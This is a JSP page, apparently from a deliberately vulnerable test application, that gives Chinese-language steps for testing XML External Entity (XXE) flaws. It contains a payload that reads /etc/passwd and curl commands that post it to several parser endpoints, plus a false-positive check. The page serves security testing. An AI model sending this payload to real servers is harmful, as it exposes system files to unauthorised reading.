<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"%>
<html>
<head>
	<title>XXE</title>
</head>
<body>
<h4>XXE</h4>
<p>测试步骤：</p>
<p>1.新建test.txt文件，文件内容如下：</p>
<pre>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE lltest[
&lt;!ENTITY xxe SYSTEM "file:////etc/passwd"&gt;
]&gt;
&lt;user&gt;&lt;username&gt;&xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
		</pre>
<p>2.发送请求包</p>

<p>DocumentBuilder</p>
<p>curl -X POST -H 'Content-type:application/xml;UTF-8' -d @test.txt http://<%=org.owasp.esapi.ESAPI.encoder().encodeForHTML(request.getServerName().toString() + ":" + request.getServerPort() + request.getContextPath()) %>/XXEServlet</p>

<p>dom4j</p>
<p>curl -X POST -H 'Content-type:application/xml;UTF-8' -d @test.txt http://<%=org.owasp.esapi.ESAPI.encoder().encodeForHTML(request.getServerName().toString() + ":" + request.getServerPort() + request.getContextPath()) %>/Dom4jXML</p>

<p>jdom2</p>
<p>curl -X POST -H 'Content-type:application/xml;UTF-8' -d @test.txt http://<%=org.owasp.esapi.ESAPI.encoder().encodeForHTML(request.getServerName().toString() + ":" + request.getServerPort() + request.getContextPath()) %>/JDom2XML</p>

<p>sax</p>
<p>curl -X POST -H 'Content-type:application/xml;UTF-8' -d @test.txt http://<%=org.owasp.esapi.ESAPI.encoder().encodeForHTML(request.getServerName().toString() + ":" + request.getServerPort() + request.getContextPath()) %>/SAXXML</p>

<p>jaxb</p>
<p>curl -X POST -H 'Content-type:application/xml;UTF-8' -d @test.txt http://<%=org.owasp.esapi.ESAPI.encoder().encodeForHTML(request.getServerName().toString() + ":" + request.getServerPort() + request.getContextPath()) %>/JAXBXML?entities=true&dtd=true</p>

<p>jaxb误报测试（禁用外部实体，不应测出漏洞）</p>
<p>curl -X POST -H 'Content-type:application/xml;UTF-8' -d @test.txt http://<%=org.owasp.esapi.ESAPI.encoder().encodeForHTML(request.getServerName().toString() + ":" + request.getServerPort() + request.getContextPath()) %>/JAXBXML?entities=false&dtd=true</p>


</body>

</html>